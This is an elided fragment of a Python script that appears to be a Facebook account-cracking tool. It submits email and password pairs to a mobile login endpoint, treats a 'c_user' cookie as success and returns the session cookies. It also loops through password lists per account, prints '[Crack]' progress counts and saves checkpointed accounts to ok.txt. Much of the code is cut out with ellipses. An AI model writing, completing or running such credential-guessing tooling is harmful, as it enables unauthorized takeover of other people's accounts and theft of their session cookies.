...
def mbasic(em,pas,hosts):
	...
	data.update(
		...
		"__req":"d","__csr":"","__a":"","__dyn":"","enokass":""
	...
	if "c_user" in list(r.cookies.get_dict().keys()):
		...
		return {"status":"ok","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
		...
		try:
			...
			for i in fl.get("pw"):
				...
				if log.get("status")=="success":
					...
					print(("\r  [ok]%s %s|%s %s      "%(O,fl.get("id"),i,N)))
			...
			print("\r  [Crack] %s/%s - ok-:%s - ok-:%s"%(self.ko,len(self.fl),len(self.ada),len(self.ok)), end=' ');sys.stdout.flush()
	...
	def __init__(self):
		...
		while True:
			...
			if f=="":continue
				...
				print ("  [+]Account chekpoint saved to: ok.txt");time.sleep(0.07)
